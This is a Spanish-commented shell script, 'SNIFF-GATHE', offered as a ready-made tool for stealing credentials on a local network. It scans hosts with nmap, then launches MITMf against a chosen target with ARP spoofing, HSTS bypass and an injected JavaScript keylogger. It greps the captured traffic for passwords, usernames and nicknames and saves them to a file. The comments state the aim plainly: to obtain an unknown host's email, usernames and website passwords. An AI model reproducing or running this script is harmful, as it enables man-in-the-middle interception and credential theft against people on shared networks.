#!/bin/sh

 

# S N I F F - G A T H E      by  N A I V E N O M 


#Es un script (shell script), para automatizar las herramientas de escaneo como Nmap y Man in the Middle como MITMF.
#El objetivo de la herramienta es el uso en una red LAN. A traves de una IP privada, donde no sabemos nada sobre ese host, 
#poder sacar su correo electronico, usuarios y contraseñas de sitios web. 
#Primero escaneamos la red con nmap, luego seleccionamos la IP donde se quiere esnifar el trafico y el gateway de la red (router). 
#Seleccionamos nuestra interfaz (ethernet, wlan, etc...).Por ultimo ejecutamos MITMf de la opcion 6 (herramienta escrita en python). 
#Se abrira una terminal nueva, donde podremos dar a la opcion 7, para ir viendo el resultado de la captura del Man in the Middle. 
#Es importante ir actualizando esta ventana, para ver nuevos resultados.

#funcion pausa

pause()
{
     read -p "Press [Enter] key to continue..." fackEnterKey
} 

#logo
_logo()
{
    
tput setaf 1;  
    echo " "
    echo  "                     /\ "
    echo  "__/\________________/  \________________________ "

tput setaf 2;
    echo " S N I F F - G A T H E       by  N A I V E N O M "                   
tput setaf 3;
    echo "::::::::::::::::::::::::::::::::::::::::::::::::"
    
    echo " " 
}

#menu
_menu()
{

tput setaf 1;  
    echo " "
    echo  "                     /\ "
    echo  "__/\________________/  \________________________ "

tput setaf 2;
    echo " S N I F F - G A T H E       by  N A I V E N O M "                   
tput setaf 3;
    echo "::::::::::::::::::::::::::::::::::::::::::::::::"
    
    echo " " 

tput sgr0;
    echo "Selecciona una opcion:"
    echo
    echo "1) Seleccionar Red [IP/MASK]"
    echo "2) Escanear hosts"
    echo "3) Seleccionar Target IP Host && Gateway"
    echo "4) Seleccionar Interface"
    echo "5) Mostrar opciones"
    echo "6) MITMF"
    echo "7) Resultado de la captura"
    echo "8) Ver captura completa"
    echo
    echo "9) Instalar Nmap"
    echo "10) Instalar MITMF (Repositorios)"
    echo "11) Instalar MITMF (Github [Recomendado])"
    echo
    echo "12) Salir"
    echo 
    echo -n "Indica una opcion: "
}

opc="0"

until [ "$opc" -eq "12" ];

do
    case $opc in

        1)
	    clear
	    _logo
	    tput setaf 2;
            echo 
            echo "Introduce tu IP/MASK (Mascara notacion decimal /8../16../24..)"
            read IP 
	    echo
	    echo "IP/MASK seleccionada: $IP"
	    echo
            pause 
            clear
            _menu 
            ;;

        2)
            clear
	    _logo
	    tput setaf 1;
            echo 
            echo "Escaneando red..."
            #nmap -sn $IP | cut -d" " -f5,6 | grep -v "^[latencyIncorporationTechnologiesMobility,a]" | tee /tmp/ip_targets | cat 
	    echo "Hosts detectados: "
	    tput setaf 2;
 	    nmap -sn $IP | cut -d" " -f5,6 | grep -e "1" | tee /tmp/ip_targets | cat
	    echo
            pause 
            clear 
            _menu
            ;;

        3)
            clear
	    _logo
	    tput setaf 1;
            echo
	    echo "Lista de hosts detectados: "
	    tput setaf 2;
            cat /tmp/ip_targets
	    echo
            echo "Selecciona IP host: "
            echo
            read IP_host 
            echo
            echo "IP seleccionada: $IP_host"
            echo
            echo "Selecciona IP Gateway:"
            echo
            read IP_gateway 
            echo
            echo "Gateway seleccionado: $IP_gateway"
	    echo
            pause  
            clear
            _menu
            ;;

        4)
            clear
	    _logo
	    tput setaf 1;
            echo 
	    echo "Interfaces disponibles: "
	    ifconfig -s | cut -d" " -f1 | grep -v "^[I]" | tee /tmp/interfaces | cat
	    echo
	    tput setaf 2;
            echo "Introduce una interfaz de la lista:"
            read interface 
            echo
            echo "Interface seleccionada: $interface"
	    echo
            pause
            clear
            _menu
            ;;

         5)
            clear
	    _logo
	    tput setaf 1;
            echo 
	    echo "Opciones establecidas: "
	    echo
	    tput setaf 2;
            echo " Objetivo: $IP_host"
            echo " Gateway: $IP_gateway"
            echo " Interface: $interface"
	    echo
            pause
            clear
            _menu
            ;;

         6)
            clear
	    _logo
            gnome-terminal -e ./sniff-gathe.sh 
            tput setaf 1;
            echo
            echo 
            echo "MITMF attack [Es necesario que este instalado el programa en /root, sino desde el source se puede modificar la ruta!!"
            echo
	    tput setaf 2;
            echo "Capturando posibles usuarios y contraseñas. "
            cd /root/MITMf #entramos en la carpeta donde se encuentra el programa (cambiar si esta en otra ruta)      
            python mitmf.py --spoof --arp -i $interface --targets $IP_host --gateway $IP_gateway --hsts --jskeylogger > /tmp/captura
            pause
            clear
            _menu
            ;;

          7)

            clear
	    _logo
	    tput setaf 2;
            echo
            echo 
            echo "Resultado de la captura [IR ACTUALIZANDO]"
            echo
            #cat /tmp/captura | grep -i 'pass' | tr -s "&" ":"  | tr -s "%40" "@"

	    #Dependiendo de la web los campos pass, user, nick cambian. Habria que ir añadiendo mas.
	    cat /tmp/captura | grep -i -e 'pass' -e 'user' -e 'nick' | cut -d" " -f8-15 | tee /tmp/credenciales
	    echo
	    echo "Credenciales guardados en /tmp/credenciales. "
            pause
            clear
            _menu
            ;;

	  8)
	    clear
	    _logo
	    echo
	    tput setaf 2;
	    echo "Captura completa: "
	    echo
	    cat /tmp/captura | uniq
	    echo
	    pause
	    clear
	    _menu
	    ;;

	  9)
	    clear
	    _logo
	    tput setaf 2;
            echo 
            echo "Instalar NMAP (Requerido tener actualizado y añadido los repositorios)"
            pause
            apt-get install nmap 
            pause
            clear
            _menu
            ;;

          10)
            clear
	    _logo
	    tput setaf 2;
            echo 
            echo "Instalar MITMF (Requerido tener actualizado y añadido los repositorios)"
            pause
            apt-get install mitmf 
            pause
            clear
            _menu
            ;;

          11)
            clear
	    _logo
	    tput setaf 2;
            echo 
            echo "Instalar MITMF (Desde Github) [Para que funcione la opcion 6, se tiene que instalar en la carpeta /root o desde el source se puede modificar la ruta!!"
            pause
          
            apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file

            echo "CLONAR REPOSITORIOS DE MITMf"
            pause
            git clone https://github.com/byt3bl33d3r/MITMf

            echo "cd AL DIRECTORIO CREADO E INICIAR Y CLONAR SUBMODULOS"
            pause
            cd MITMf && git submodule init && git submodule update --recursive

            echo "INSTALAR DEPENDENCIAS"
            pause
            pip install -r requirements.txt

            pause
            clear
            _menu
            ;;

        *)
            # Esta opcion se ejecuta si no es ninguna de las anteriores
            clear
            _menu
            ;;
    esac
    read opc
done
